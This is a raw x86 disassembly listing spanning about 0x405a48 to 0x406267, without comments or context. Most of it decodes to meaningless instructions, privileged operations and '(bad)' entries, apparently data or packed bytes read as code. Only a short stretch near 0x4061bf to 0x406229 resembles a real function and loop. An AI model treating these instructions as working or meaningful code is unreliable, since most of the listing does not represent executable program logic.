  405a48:	js     0x405a40
  405a4a:	xor    eax,0xe0d02c6d
  405a4f:	cmp    DWORD PTR [edi-0x328ca771],ebx
  405a55:	push   ds
  405a56:	add    al,0xe3
  405a58:	mov    esi,0x76f8372d
  405a5d:	dec    ebp
  405a5e:	mov    ds:0x86eede56,eax
  405a63:	mov    ch,0xfd
  405a65:	pop    edx
  405a66:	sub    ecx,esp
  405a68:	jge    0x405a51
  405a6a:	mov    eax,0x273432e9
  405a6f:	sub    DWORD PTR [ecx-0x3a2b6684],0xffffffa5
  405a76:	mov    ecx,0xe5e78b6a
  405a7b:	iret   
  405a7c:	xchg   ebx,edx
  405a7e:	outs   dx,BYTE PTR ds:[esi]
  405a7f:	fisub  DWORD PTR [ecx]
  405a81:	pop    ebp
  405a82:	or     al,0x9
  405a84:	sti    
  405a85:	ds jae 0x405aa0
  405a88:	in     al,0x37
  405a8a:	bound  ebx,QWORD PTR [ebp-0x6]
  405a8d:	xchg   ebx,eax
  405a8e:	jb     0x405a31
  405a90:	dec    ebx
  405a91:	push   es
  405a92:	popf   
  405a93:	inc    edx
  405a94:	cli    
  405a95:	pop    edi
  405a96:	cwde   
  405a97:	lds    ebp,FWORD PTR [ebx-0x52]
  405a9a:	mov    al,ds:0x8f4b6d85
  405a9f:	mov    eax,0x9a454130
  405aa4:	mov    DWORD PTR [eax+0x578c8ad3],esi
  405aaa:	mov    bl,0xf9
  405aac:	sahf   
  405aad:	adc    eax,0x7c09d5bc
  405ab2:	mov    eax,0xb23b2212
  405ab7:	inc    ebx
  405ab8:	ja     0x405a73
  405aba:	or     BYTE PTR [eax-0x1f],dh
  405abd:	aas    
  405abe:	mov    DWORD PTR [edx*8-0x433aa1f7],esp
  405ac5:	pop    edi
  405ac6:	in     al,0x41
  405ac8:	pop    es
  405ac9:	repnz rcr BYTE PTR [esi],1
  405acc:	pop    edi
  405acd:	ds loop 0x405ad8
  405ad0:	mov    dh,0xbf
  405ad2:	push   ebx
  405ad3:	add    eax,esp
  405ad5:	jle    0x405b2a
  405ad7:	inc    esi
  405ad8:	and    cl,BYTE PTR [edx-0xf]
  405adb:	push   ebp
  405adc:	ins    BYTE PTR es:[edi],dx
  405add:	mov    ah,0x23
  405adf:	fs inc ebx
  405ae1:	mov    esi,0x7d0c0d81
  405ae6:	push   ebp
  405ae7:	add    edi,DWORD PTR [ebx]
  405ae9:	aaa    
  405aea:	mov    eax,0x84231a54
  405aef:	arpl   WORD PTR [esi],sp
  405af1:	in     al,dx
  405af2:	push   ds
  405af3:	xchg   ecx,eax
  405af4:	jl     0x405b5c
  405af6:	or     bl,BYTE PTR [ebp+0x479d9746]
  405afc:	pusha  
  405afd:	mov    eax,DWORD PTR [ebp*1-0x71d3bfc9]
  405b04:	dec    esi
  405b05:	or     al,0xd8
  405b07:	fbstp  TBYTE PTR [edx+esi*8-0x42]
  405b0b:	cmp    BYTE PTR [edi+0x25],ch
  405b0e:	outs   dx,BYTE PTR ds:[esi]
  405b0f:	push   es
  405b10:	pop    ds
  405b11:	(bad)  
  405b12:	imul   ebp,DWORD PTR [edx],0x4d47af3c
  405b18:	jge    0x405abd
  405b1a:	int3   
  405b1b:	sbb    al,0xb7
  405b1d:	out    0x27,eax
  405b1f:	xor    eax,0xdc504f22
  405b24:	in     eax,0xca
  405b26:	xor    eax,0x8c7a51bf
  405b2b:	cmp    DWORD PTR [esi+0x13ea064b],0xfffffffe
  405b32:	jo     0x405b74
  405b34:	fwait
  405b35:	out    0xeb,eax
  405b37:	sti    
  405b38:	cld    
  405b39:	loope  0x405ba0
  405b3b:	mov    bh,dh
  405b3d:	or     al,0xd1
  405b3f:	jno    0x405ac7
  405b41:	xchg   ebx,eax
  405b42:	jmp    0x8a89:0x8c3bd7c4
  405b49:	popf   
  405b4a:	bound  esi,QWORD PTR es:[ecx+0x713c3636]
  405b51:	or     BYTE PTR [ebp+0x1f813e6e],al
  405b57:	sbb    dl,BYTE PTR [esi]
  405b59:	in     eax,dx
  405b5a:	pop    eax
  405b5b:	repz push 0xffffff84
  405b5e:	xor    ch,BYTE PTR [ebx-0x22]
  405b61:	div    edx
  405b63:	retf   
  405b64:	(bad)  
  405b65:	sbb    al,0xd0
  405b67:	push   0x3583eeb6
  405b6c:	mov    esp,0x4a17ce3b
  405b71:	call   0xfe8a:0xaee7f89
  405b78:	lock sbb BYTE PTR [ecx+0x4f],dh
  405b7c:	fdiv   st,st(3)
  405b7e:	fisubr DWORD PTR [edi-0x1d2c2f1e]
  405b84:	aas    
  405b85:	dec    edi
  405b86:	int    0xa
  405b88:	pop    esi
  405b89:	loope  0x405b64
  405b8b:	popf   
  405b8c:	mov    ds:0x4e0a940,eax
  405b91:	pop    es
  405b92:	imul   ecx,DWORD PTR gs:[ebx],0xa2241b59
  405b99:	mov    al,ds:0xfaa3aba2
  405b9e:	sub    ebx,DWORD PTR [esi+edi*4-0x3bf10d41]
  405ba5:	pop    esi
  405ba6:	jbe    0x405c17
  405ba8:	pop    ecx
  405ba9:	test   edx,esp
  405bab:	dec    esp
  405bac:	clc    
  405bad:	das    
  405bae:	pop    esp
  405baf:	bnd jnp 0x405c20
  405bb2:	jne    0x405bf6
  405bb4:	loop   0x405bb3
  405bb6:	jle    0x405c2c
  405bb8:	dec    ebp
  405bb9:	xchg   esp,eax
  405bba:	inc    ecx
  405bbb:	stc    
  405bbc:	add    al,0x51
  405bbe:	enter  0x23f3,0xc5
  405bc2:	push   esp
  405bc3:	loopne 0x405b93
  405bc5:	jae    0x405bd7
  405bc7:	jg     0x405c11
  405bc9:	push   es
  405bca:	(bad)  
  405bcb:	hlt    
  405bcc:	loopne 0x405c24
  405bce:	sbb    dh,cl
  405bd0:	imul   eax,DWORD PTR [ebx+0x36],0xffffff83
  405bd4:	imul   esp,ebp,0x6e8ca34c
  405bda:	sub    DWORD PTR [ebx],ebp
  405bdc:	ret    
  405bdd:	popa   
  405bde:	in     eax,dx
  405bdf:	outs   dx,BYTE PTR ds:[esi]
  405be0:	mov    ds:0x7160ae60,eax
  405be5:	cmp    ch,BYTE PTR [edi-0x1ab21012]
  405beb:	(bad)  
  405bed:	push   0xc2df9d22
  405bf2:	push   0xffffffca
  405bf4:	lods   al,BYTE PTR ds:[esi]
  405bf5:	stc    
  405bf6:	call   DWORD PTR [ecx-0x206156ba]
  405bfc:	sbb    DWORD PTR [ebp-0x2d],0x5ac87011
  405c03:	pop    ecx
  405c04:	add    BYTE PTR [ebp-0x1b],0xb3
  405c08:	bound  ebp,QWORD PTR [eax-0x55]
  405c0b:	nop
  405c0c:	sbb    DWORD PTR [ebp+edx*1-0x1e],eax
  405c10:	add    BYTE PTR [ecx+0x66c9c5aa],dl
  405c16:	dec    edi
  405c17:	and    BYTE PTR [eax-0x72d12a4],0xa
  405c1e:	mov    eax,ds:0x146e873a
  405c23:	push   ecx
  405c24:	mov    ecx,0xcc079f0b
  405c29:	mov    eax,ds:0xefff7a2f
  405c2e:	int3   
  405c2f:	rol    BYTE PTR [edi-0x75084838],1
  405c35:	(bad)  
  405c36:	pop    ss
  405c37:	icebp  
  405c38:	aam    0x74
  405c3a:	das    
  405c3b:	or     al,0xb1
  405c3d:	jle    0x405c9c
  405c3f:	mov    ch,0x90
  405c41:	jmp    0x405c1d
  405c43:	mov    eax,ebp
  405c45:	loopne 0x405bd7
  405c47:	imul   eax,DWORD PTR [edi-0x438b098f],0x5d54140d
  405c51:	and    BYTE PTR [edx+0x7809f999],0xae
  405c58:	iret   
  405c59:	sar    ebp,1
  405c5b:	mov    eax,0xe25c68bd
  405c60:	sti    
  405c61:	iret   
  405c62:	adc    ebx,DWORD PTR [ebp+0x4ff61e6d]
  405c68:	dec    eax
  405c69:	popf   
  405c6a:	or     al,0xe2
  405c6c:	pop    ebp
  405c6d:	fcmove st,st(1)
  405c6f:	fadd   QWORD PTR [ebp+0x28]
  405c72:	test   eax,0x316ffd34
  405c77:	sub    ah,BYTE PTR [eax+0xb]
  405c7a:	sbb    DWORD PTR [edi-0x5260f0e6],edx
  405c80:	popa   
  405c81:	push   ebx
  405c82:	adc    eax,0x855e2f36
  405c87:	add    BYTE PTR [edi],0x18
  405c8a:	mov    eax,0x2ebf702c
  405c8f:	jnp    0x405cca
  405c91:	shl    dl,cl
  405c93:	xor    DWORD PTR [ebp+0x2e],ecx
  405c96:	cld    
  405c97:	sub    al,0x25
  405c99:	sbb    DWORD PTR [edi+0x1fa02627],esi
  405c9f:	mov    ah,0x4e
  405ca1:	fnstcw WORD PTR [esi]
  405ca3:	xchg   ecx,eax
  405ca4:	or     DWORD PTR [ecx-0x7ea3853],ebp
  405caa:	jno    0x405c61
  405cac:	hlt    
  405cad:	ret    0xf123
  405cb0:	sbb    DWORD PTR es:[ebx-0x47],edx
  405cb4:	ins    DWORD PTR es:[edi],dx
  405cb5:	outs   dx,BYTE PTR ds:[esi]
  405cb6:	jns    0x405c98
  405cb8:	or     DWORD PTR [edx+0x7e38180b],ecx
  405cbe:	enter  0x2da7,0xc7
  405cc2:	push   ecx
  405cc3:	jecxz  0x405c95
  405cc5:	xor    DWORD PTR [ecx-0x25],ebx
  405cc8:	ins    DWORD PTR es:[edi],dx
  405cc9:	(bad)  
  405cca:	lods   al,BYTE PTR ds:[esi]
  405ccb:	out    dx,eax
  405ccc:	jl     0x405d44
  405cce:	imul   edi,eax,0x73645600
  405cd4:	retf   
  405cd5:	mov    eax,ds:0x4a7268b0
  405cda:	mov    ebp,0xa49ce6ce
  405cdf:	jae    0x405ce9
  405ce1:	pushf  
  405ce2:	not    DWORD PTR [ebx]
  405ce4:	pusha  
  405ce5:	fist   WORD PTR [eax+0x23fa7257]
  405ceb:	(bad)  
  405cec:	aam    0x5
  405cee:	sbb    ebp,DWORD PTR [edx+0xd]
  405cf1:	push   es
  405cf2:	add    al,0x73
  405cf4:	sahf   
  405cf5:	add    esi,DWORD PTR [ebp-0xa5da9d5]
  405cfb:	jnp    0x405ca4
  405cfd:	xchg   esi,eax
  405cfe:	jmp    0x405d2e
  405d00:	sub    BYTE PTR [ebx+0x2b],ah
  405d03:	xchg   esi,eax
  405d04:	cmp    al,0xe
  405d06:	xchg   BYTE PTR [eax],bh
  405d08:	jmp    0x8305dda1
  405d0d:	and    eax,0xe3219f43
  405d12:	shl    dh,cl
  405d14:	sub    DWORD PTR [edx-0x6b],edi
  405d17:	push   ss
  405d18:	or     edx,DWORD PTR [edx]
  405d1a:	and    esi,edx
  405d1c:	dec    edi
  405d1d:	inc    esp
  405d1e:	inc    ebx
  405d1f:	(bad)  
  405d20:	pop    ds
  405d21:	cmp    BYTE PTR [eax+0x75147c1b],ch
  405d27:	(bad)  
  405d28:	mov    ch,0x48
  405d2a:	clc    
  405d2b:	(bad)  
  405d2d:	sbb    esp,0x3b
  405d30:	out    dx,eax
  405d31:	jg     0x405d15
  405d33:	sub    eax,0x4f354a79
  405d38:	push   ss
  405d39:	arpl   WORD PTR [edi],ax
  405d3b:	jbe    0x405cec
  405d3d:	dec    edx
  405d3e:	and    DWORD PTR [edx+eax*8],eax
  405d41:	popf   
  405d42:	jae    0x405d64
  405d44:	xor    DWORD PTR [esp+ecx*1],0x198dc95e
  405d4b:	das    
  405d4c:	push   fs
  405d4e:	mov    ds:0xff5ebe24,al
  405d53:	leave  
  405d54:	pusha  
  405d55:	sar    DWORD PTR [edi+edx*4+0x5c5e7104],cl
  405d5c:	sub    edx,esi
  405d5e:	adc    dl,ch
  405d60:	imul   esp,DWORD PTR [esi],0xffffffa3
  405d63:	and    ah,dh
  405d65:	shl    BYTE PTR [ecx+0x1ebfe387],cl
  405d6b:	xor    BYTE PTR [esi],0xf
  405d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d6f:	outs   dx,BYTE PTR ds:[esi]
  405d70:	bound  ebx,QWORD PTR [edi-0x6c5e980b]
  405d76:	gs das 
  405d78:	push   eax
  405d79:	in     al,dx
  405d7a:	push   0x27
  405d7c:	push   esi
  405d7d:	fiadd  DWORD PTR [edi+eax*8-0x773d3aff]
  405d84:	sub    al,0x5
  405d86:	jle    0x405d9b
  405d88:	(bad)  
  405d89:	xchg   esi,eax
  405d8a:	stos   DWORD PTR es:[edi],eax
  405d8b:	ror    dh,cl
  405d8d:	mov    cl,BYTE PTR [eax-0x43ede1b3]
  405d93:	pop    edx
  405d94:	std    
  405d95:	dec    ebp
  405d96:	inc    edi
  405d97:	bound  edx,QWORD PTR [edi-0x3f]
  405d9a:	mov    ch,0xaf
  405d9c:	adc    BYTE PTR [edx-0x2816d285],0x61
  405da3:	mov    dl,0x49
  405da5:	pop    ebx
  405da6:	pop    ebx
  405da7:	add    DWORD PTR [esi],esi
  405da9:	imul   esi,DWORD PTR ds:0xc2d3b346,0x2fd7adff
  405db3:	xchg   DWORD PTR [esp+edx*2],esi
  405db6:	js     0x405daa
  405db8:	js     0x405e2f
  405dba:	dec    esi
  405dbb:	ss dec edi
  405dbd:	popf   
  405dbe:	and    DWORD PTR [edx],edi
  405dc0:	lods   al,BYTE PTR ds:[esi]
  405dc1:	mov    ch,0xb6
  405dc3:	sub    al,0xa3
  405dc5:	call   0x137c5576
  405dca:	dec    edx
  405dcb:	dec    BYTE PTR [ebx+0x71732fea]
  405dd1:	in     al,0x3f
  405dd3:	fldenv [edi+0x7b94e4d5]
  405dd9:	ins    DWORD PTR es:[edi],dx
  405dda:	xchg   ecx,eax
  405ddb:	cdq    
  405ddc:	xor    ch,BYTE PTR [esi]
  405dde:	hlt    
  405ddf:	push   ebp
  405de0:	mov    al,0xa1
  405de2:	sahf   
  405de3:	(bad)  
  405de4:	je     0x405d9a
  405de6:	xchg   ebp,esi
  405de8:	adc    BYTE PTR [ebx+0x2c],dl
  405deb:	pop    eax
  405dec:	mov    ebx,0xfd1b1f25
  405df1:	lock sbb eax,0x98a3ce00
  405df7:	sbb    eax,0xe551a0c4
  405dfc:	mov    ch,0x40
  405dfe:	and    ebx,DWORD PTR [eax]
  405e00:	sbb    al,0xbf
  405e02:	xor    BYTE PTR [edx-0x56],dh
  405e05:	out    dx,al
  405e06:	jle    0x405db1
  405e08:	sub    al,0xaf
  405e0a:	sub    esp,ecx
  405e0c:	sub    bl,cl
  405e0e:	dec    ebx
  405e0f:	addr16 das 
  405e11:	lahf   
  405e12:	jl     0x405dae
  405e14:	mov    WORD PTR [ecx-0x488e020b],ds
  405e1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e1b:	inc    ecx
  405e1c:	lea    eax,[ebx]
  405e1e:	and    BYTE PTR [edi+0x79],ch
  405e21:	ret    
  405e22:	js     0x405e3d
  405e24:	mov    bl,0x9e
  405e26:	lods   eax,DWORD PTR ds:[esi]
  405e27:	in     eax,0x72
  405e29:	mov    al,0xe9
  405e2b:	pop    ebx
  405e2c:	adc    DWORD PTR [edx+0x350ffa4],0xe72b93ba
  405e36:	mov    dl,0x35
  405e38:	mov    bh,0xcf
  405e3a:	xchg   ecx,eax
  405e3b:	push   ecx
  405e3c:	sbb    esi,esp
  405e3e:	pop    ds
  405e3f:	pop    ss
  405e40:	push   ecx
  405e41:	xor    BYTE PTR [edi+0x6e],bh
  405e44:	push   es
  405e45:	cli    
  405e46:	or     BYTE PTR [eax+esi*2+0x4],0x7f
  405e4b:	or     ebx,ecx
  405e4d:	push   ebx
  405e4e:	mov    ebp,0xda95cb64
  405e53:	(bad)  [edx+0x18786ed8]
  405e59:	fistp  QWORD PTR fs:[edx+0x6f]
  405e5d:	in     al,dx
  405e5e:	xchg   edx,eax
  405e5f:	xor    BYTE PTR [edx-0x28],bh
  405e62:	mov    WORD PTR [ebx+0x45bb910b],es
  405e68:	sub    ch,BYTE PTR [esi]
  405e6a:	ss sti 
  405e6c:	mov    esi,0x43f0e87b
  405e71:	dec    eax
  405e72:	cli    
  405e73:	jns    0x405e91
  405e75:	test   eax,0x4390a061
  405e7a:	xor    DWORD PTR [esi-0x5e3846ac],0xffffffb8
  405e81:	and    al,0xcd
  405e83:	rol    BYTE PTR [ebx+0x68ef94f4],1
  405e89:	mov    esp,?
  405e8b:	mov    al,ds:0x5150e96f
  405e90:	sbb    esp,0x52
  405e93:	fldcw  WORD PTR [esi-0x722f51a2]
  405e99:	inc    edi
  405e9a:	fidivr WORD PTR ds:0xc4e6d135
  405ea0:	lahf   
  405ea1:	out    0xe7,eax
  405ea3:	adc    al,bl
  405ea5:	dec    eax
  405ea6:	inc    esi
  405ea7:	fs clc 
  405ea9:	mov    dl,0x9d
  405eab:	fidivr DWORD PTR [edi-0x694dfe79]
  405eb1:	pop    ebp
  405eb2:	nop
  405eb3:	shr    BYTE PTR [ecx],cl
  405eb5:	or     DWORD PTR [edi+0x1],0x2ff49b06
  405ebc:	xor    ch,bh
  405ebe:	and    eax,DWORD PTR [edx+esi*1+0x75]
  405ec2:	shl    BYTE PTR [ecx],1
  405ec4:	add    BYTE PTR [edx-0x54349c6b],0xd8
  405ecb:	addr16 mov dh,0x61
  405ece:	xchg   edi,eax
  405ecf:	xor    eax,DWORD PTR [ecx+0x4d740e9c]
  405ed5:	sub    BYTE PTR [ebp+0x2525acae],bh
  405edb:	mov    ebp,DWORD PTR [esi]
  405edd:	pop    DWORD PTR [esi+ebx*2-0x3f8c0bf]
  405ee4:	sub    dh,BYTE PTR [eax+ebx*4+0x6d]
  405ee8:	mov    dh,0x5e
  405eea:	dec    edi
  405eeb:	(bad)  
  405eec:	imul   ebx,edi,0xa6170233
  405ef2:	mov    gs,WORD PTR [esi*1+0x62a81cfd]
  405ef9:	imul   esp,DWORD PTR [edx-0x1e2f2619],0xcd2b2e6
  405f03:	popa   
  405f04:	xchg   BYTE PTR [bx+0x33c0],dh
  405f09:	inc    esp
  405f0a:	inc    ecx
  405f0b:	jl     0x405f6a
  405f0d:	(bad)  
  405f0e:	icebp  
  405f0f:	hlt    
  405f10:	dec    ebp
  405f11:	out    0xaf,eax
  405f13:	(bad)  
  405f14:	call   0x7b8bd1dc
  405f19:	jbe    0x405f90
  405f1b:	imul   esi,DWORD PTR [esp+eiz*4],0x6aaadf6e
  405f22:	pop    edi
  405f23:	cmp    al,BYTE PTR [edi-0x3c]
  405f26:	xor    al,0xbf
  405f28:	jnp    0x405f94
  405f2a:	xor    ecx,DWORD PTR [esp+eax*1-0x1f6f1a4b]
  405f31:	adc    DWORD PTR ds:0x5fc69be5,esp
  405f37:	or     ch,dh
  405f39:	mov    bl,0x57
  405f3b:	mov    bl,0x2
  405f3d:	pop    esp
  405f3e:	inc    ecx
  405f3f:	jl     0x405f78
  405f41:	pop    eax
  405f42:	pop    es
  405f43:	pop    ds
  405f44:	dec    ecx
  405f45:	daa    
  405f46:	pop    ecx
  405f47:	mov    dl,cl
  405f49:	mov    cl,0x27
  405f4b:	rcr    DWORD PTR [ecx+0x5755ea22],0xaa
  405f52:	jl     0x405f77
  405f54:	jl     0x405fbd
  405f56:	mul    al
  405f58:	fxtract 
  405f5a:	int    0x82
  405f5c:	(bad)  
  405f5d:	push   ecx
  405f5e:	scas   al,BYTE PTR es:[edi]
  405f5f:	jnp    0x405f91
  405f61:	fcom   st(2)
  405f63:	mov    dh,0xf5
  405f65:	xchg   esi,eax
  405f66:	mov    ds:0x83b15d1b,eax
  405f6c:	add    al,BYTE PTR [edx+0x7bfdf314]
  405f72:	mov    dl,0xd5
  405f74:	or     BYTE PTR [esi+0x3485295b],0xdd
  405f7b:	addr16 imul esp,esp,0x686b72d5
  405f82:	pop    DWORD PTR [eax+0x194e9fd9]
  405f88:	out    dx,eax
  405f89:	in     eax,0xd6
  405f8b:	mov    al,0x18
  405f8d:	pusha  
  405f8e:	jne    0x405fd0
  405f90:	jl     0x405f3d
  405f92:	mov    dh,0x7
  405f94:	sbb    DWORD PTR ds:0x1d2c86ce,esp
  405f9a:	dec    edi
  405f9b:	pop    es
  405f9c:	fistp  QWORD PTR ds:0x269efdbc
  405fa3:	ins    DWORD PTR es:[edi],dx
  405fa4:	rcr    BYTE PTR [ecx-0x46],1
  405fa7:	rcl    DWORD PTR [eax+0x51],0x68
  405fab:	pusha  
  405fac:	xor    DWORD PTR [ecx],ebx
  405fae:	xor    al,0xb
  405fb0:	sahf   
  405fb1:	jecxz  0x405f4b
  405fb3:	call   0x3cbb232e
  405fb8:	dec    ecx
  405fb9:	inc    eax
  405fba:	mov    DWORD PTR [ecx-0x4c0bf21b],eax
  405fc0:	push   edi
  405fc1:	sbb    dh,bl
  405fc3:	nop
  405fc4:	rol    BYTE PTR [edx+0x32],1
  405fc7:	test   dh,0x8
  405fca:	ins    DWORD PTR es:[edi],dx
  405fcb:	(bad)  [edi-0x13]
  405fce:	retf   0xf26c
  405fd1:	out    0xa5,al
  405fd3:	push   0x3
  405fd5:	test   DWORD PTR [esi+0xd9f83ed],esp
  405fdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fdc:	scas   eax,DWORD PTR es:[edi]
  405fdd:	jns    0x405fea
  405fdf:	mov    cl,BYTE PTR [edi-0xb11d22f]
  405fe5:	inc    edx
  405fe6:	fmulp  st(5),st
  405fe8:	and    DWORD PTR [edi],ebx
  405fea:	std    
  405feb:	push   esp
  405fec:	lods   al,BYTE PTR ds:[esi]
  405fed:	das    
  405fee:	sub    al,0x78
  405ff0:	and    BYTE PTR [ecx+0x4b],dl
  405ff3:	cdq    
  405ff4:	xor    ecx,0xa040b211
  405ffa:	sbb    al,0xe2
  405ffc:	dec    eax
  405ffd:	cli    
  405ffe:	loop   0x405feb
  406000:	adc    bl,BYTE PTR [ebx+0x10]
  406003:	cmp    BYTE PTR cs:[ebp-0x3b],ah
  406007:	push   ebx
  406008:	daa    
  406009:	cmc    
  40600a:	(bad)  [ecx+0xb]
  40600d:	test   DWORD PTR [ebp-0x290ca258],edi
  406013:	and    ch,BYTE PTR [edi]
  406015:	mov    eax,0x9410ff48
  40601a:	inc    ecx
  40601b:	or     dl,BYTE PTR [eax]
  40601d:	test   bh,ch
  40601f:	adc    dh,BYTE PTR [edi]
  406021:	repz cmp eax,0xade4c8dd
  406027:	inc    esp
  406028:	jge    0x406058
  40602a:	cmp    ah,BYTE PTR [esp+ebx*8-0x53]
  40602e:	ss pop ecx
  406030:	jmp    0x6c49d483
  406035:	jnp    0x406037
  406037:	ror    BYTE PTR [eax-0x2b],1
  40603a:	sub    BYTE PTR ds:[eax+ebx*2-0x9],bh
  40603f:	cmp    eax,0x52433484
  406044:	ret    
  406045:	jp     0x406032
  406047:	fadd   QWORD PTR [ecx]
  406049:	ret    0xb757
  40604c:	fild   QWORD PTR [eax+0x3f9a8f67]
  406052:	xchg   BYTE PTR [esi-0x1fc349b],cl
  406058:	adc    dl,BYTE PTR [eax-0x52]
  40605b:	jp     0x405ffb
  40605d:	rcl    cl,1
  40605f:	xchg   DWORD PTR [eax-0x24],esi
  406062:	mov    ah,0x4a
  406064:	push   ds
  406065:	sbb    al,0xb5
  406067:	mov    al,0xec
  406069:	mov    ds:0x570671d8,al
  40606e:	sub    DWORD PTR [ecx+ebx*2+0x3f],edx
  406072:	pop    edx
  406073:	jne    0x406085
  406075:	rcl    DWORD PTR [eax-0x75fa6d26],0xf7
  40607c:	mov    eax,ds:0xa1794244
  406081:	sbb    al,cl
  406083:	inc    edx
  406084:	cmp    BYTE PTR [edx],al
  406086:	test   al,0x3
  406088:	rcl    BYTE PTR [ebx+0x14],0x8c
  40608c:	push   esi
  40608d:	sbb    DWORD PTR [ecx-0x4ba7bc90],edx
  406093:	sahf   
  406094:	stos   BYTE PTR es:[edi],al
  406095:	(bad)  
  406096:	pop    ss
  406097:	or     ecx,DWORD PTR [ebp+esi*1-0x5818104a]
  40609e:	loope  0x406100
  4060a0:	cmp    DWORD PTR [ebp-0x5b4d855],ebx
  4060a6:	int    0xce
  4060a8:	mov    ss,ebx
  4060aa:	add    BYTE PTR [edi],ah
  4060ac:	into   
  4060ad:	jnp    0x40608b
  4060af:	test   BYTE PTR [edx-0x11],dl
  4060b2:	sub    esp,DWORD PTR [edi]
  4060b4:	nop    DWORD PTR [edx-0x3def80fc]
  4060bb:	xchg   esi,eax
  4060bc:	je     0x406138
  4060be:	retf   0xba41
  4060c1:	lods   eax,DWORD PTR ds:[esi]
  4060c2:	cmp    DWORD PTR [ebp+esi*8-0x7a],edi
  4060c6:	jnp    0x4060ff
  4060c8:	popf   
  4060c9:	not    DWORD PTR [ecx+edx*1-0x48]
  4060cd:	adc    eax,0x9ab49705
  4060d2:	pop    edx
  4060d3:	aas    
  4060d4:	jmp    0x406069
  4060d6:	sub    BYTE PTR [ecx-0x34c5a884],al
  4060dc:	(bad)  
  4060dd:	jns    0x4060ea
  4060df:	fld    QWORD PTR [edi+0x1]
  4060e2:	cmp    ebx,DWORD PTR [ecx+0x433e68e2]
  4060e8:	xchg   edx,eax
  4060e9:	mov    ecx,0x5627d110
  4060ee:	pop    ss
  4060ef:	mov    esp,0x37f6a266
  4060f4:	jnp    0x406096
  4060f6:	data16 aas 
  4060f8:	xlat   BYTE PTR ds:[ebx]
  4060f9:	mov    ah,0xe0
  4060fb:	js     0x40616a
  4060fd:	add    bl,al
  4060ff:	adc    DWORD PTR [edi+0x5],0xffffffea
  406103:	push   ds
  406104:	push   ss
  406105:	fdiv   QWORD PTR [edi]
  406107:	cmp    ch,BYTE PTR [edi]
  406109:	ret    
  40610a:	sbb    eax,DWORD PTR ds:0x103fe6ad
  406110:	retf   
  406111:	arpl   WORD PTR [edi+eiz*1-0x37],cx
  406115:	inc    eax
  406116:	aaa    
  406117:	mov    ds:0x43067dd0,al
  40611c:	ins    DWORD PTR es:[edi],dx
  40611d:	sti    
  40611e:	sub    BYTE PTR [ecx-0x47db46fe],dh
  406124:	(bad)  
  406125:	jne    0x406150
  406127:	inc    esp
  406128:	scas   eax,DWORD PTR es:[edi]
  406129:	jnp    0x406188
  40612b:	out    0x11,eax
  40612d:	xor    eax,DWORD PTR [ecx-0x20]
  406130:	push   ds
  406131:	mov    ebp,0x6fe8145c
  406136:	repnz sbb BYTE PTR [edx+0x22428c82],al
  40613d:	dec    ecx
  40613e:	ds mov ah,0xa0
  406141:	sbb    BYTE PTR ds:0x393a69ab,dh
  406147:	inc    ecx
  406148:	fwait
  406149:	jmp    0x3bed86e9
  40614e:	and    dl,ah
  406150:	arpl   WORD PTR [esi],ax
  406152:	fiadd  DWORD PTR [ecx-0x13c614ce]
  406158:	pop    ss
  406159:	repnz sub DWORD PTR [ebx],edx
  40615c:	mov    ebx,0xfc366b8
  406161:	repz or al,BYTE PTR ds:0xa85c95c3
  406168:	dec    ebp
  406169:	cmp    al,0x25
  40616b:	ret    
  40616c:	mov    bl,0xc2
  40616e:	jbe    0x40616d
  406170:	(bad)  
  406172:	ins    BYTE PTR es:[di],dx
  406174:	add    dl,bl
  406176:	(bad)  
  406177:	or     eax,0x6a3e04e9
  40617c:	push   ebx
  40617d:	pop    ebp
  40617e:	push   eax
  40617f:	sub    al,0xb1
  406181:	and    esp,DWORD PTR [ecx-0x57d72c70]
  406187:	lods   al,BYTE PTR ds:[esi]
  406188:	inc    ebx
  406189:	xor    eax,0xaa777d
  40618e:	shr    DWORD PTR [edx+0x3329a9c8],0xd5
  406195:	add    esp,edi
  406197:	mov    esi,0x5271e6ec
  40619c:	aad    0xa9
  40619e:	(bad)  
  40619f:	xor    DWORD PTR [edi+0x54ae4945],edi
  4061a5:	nop
  4061a6:	pop    ebx
  4061a7:	push   0x421c4daa
  4061ac:	scas   eax,DWORD PTR es:[edi]
  4061ad:	xor    eax,0xa3266a8a
  4061b2:	pop    ebp
  4061b3:	xchg   esp,eax
  4061b4:	fiadd  WORD PTR [ecx-0x55]
  4061b7:	stos   BYTE PTR es:[edi],al
  4061b8:	mov    BYTE PTR [ecx+ebx*1+0x3272f6],al
  4061bf:	mov    eax,DWORD PTR [ebp+0xc]
  4061c2:	xor    eax,esi
  4061c4:	add    eax,edi
  4061c6:	pop    edi
  4061c7:	pop    esi
  4061c8:	pop    ebx
  4061c9:	leave  
  4061ca:	ret    0x8
  4061cd:	xor    eax,eax
  4061cf:	ret    
  4061d0:	push   ebp
  4061d1:	mov    ebp,esp
  4061d3:	sub    esp,0x38
  4061d6:	and    DWORD PTR ds:0x428ec7,0x0
  4061e0:	xor    eax,eax
  4061e2:	xor    eax,DWORD PTR ds:0x428ec7
  4061e8:	inc    eax
  4061e9:	mov    ds:0x428ec7,eax
  4061ee:	cmp    DWORD PTR ds:0x428ec7,0x24
  4061f5:	jg     0x406216
  4061fb:	jmp    0x406209
  406200:	push   DWORD PTR [ebp-0x18]
  406203:	call   DWORD PTR ds:0x42aa3b
  406209:	cmp    DWORD PTR ds:0x428ec7,0x19
  406210:	jb     0x4061e0
  406216:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40621d:	push   ebx
  40621e:	mov    eax,ds:0x428e23
  406223:	adc    DWORD PTR ds:0x428e9f,eax
  406229:	jmp    0x4085d8
  40622e:	xchg   ebp,eax
  40622f:	(bad)
  406232:	xchg   edx,eax
  406233:	add    al,0x95
  406235:	(bad)
  406239:	stos   DWORD PTR es:[edi],eax
  40623a:	sub    DWORD PTR [ebp+0x20],edi
  40623d:	jb     0x40624a
  40623f:	cmp    eax,0x60f18383
  406244:	add    DWORD PTR [ebx+0x3c01aee6],0xfffffff3
  40624b:	jbe    0x406277
  40624d:	pop    es
  40624e:	dec    edx
  40624f:	xlat   BYTE PTR ds:[ebx]
  406250:	shl    DWORD PTR [ecx-0x976f837],0x7e
  406257:	jno    0x4061e8
  406259:	fucomip st,st(4)
  40625b:	enter  0x6c97,0xb5
  40625f:	dec    ebp
  406260:	fnstsw WORD PTR [esi+eiz*8+0x1230ab14]
  406267:	es sub al,0xfe
